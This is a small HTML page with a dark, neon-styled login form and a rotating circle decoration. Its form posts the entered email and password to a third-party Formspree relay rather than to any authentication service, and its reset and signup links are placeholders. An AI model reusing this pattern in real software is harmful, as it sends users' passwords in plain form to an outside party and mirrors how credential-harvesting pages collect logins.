<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Form</title>
    <style>
        body {
            background-color: #1a1a2e;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
        }
        .login-container {
            text-align: center;
            color: #00f0ff;
        }
        .login-container h2 {
            margin-bottom: 20px;
        }
        .login-container input {
            display: block;
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
        }
        .login-container button {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            background-color: #00f0ff;
            color: #1a1a2e;
            cursor: pointer;
        }
        .login-container a {
            color: #00f0ff;
            text-decoration: none;
        }
        .circular-design {
            position: absolute;
            width: 300px;
            height: 300px;
            border-radius: 50%;
            border: 10px solid #00f0ff;
            animation: rotate 10s linear infinite;
        }
        @keyframes rotate {
            from {
                transform: rotate(0deg);
            }
            to {
                transform: rotate(360deg);
            }
        }
    </style>
</head>
<body>
    <div class="circular-design"></div>
    <div class="login-container">
        <h2>Login</h2>
        <form action="https://formspree.io/f/mqakanej" method="POST">
            <input type="email" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <a href="#">Forgot your password?</a>
            <button type="submit">Login</button>
        </form>
        <a href="#">Signup</a>
    </div>
</body>
</html>
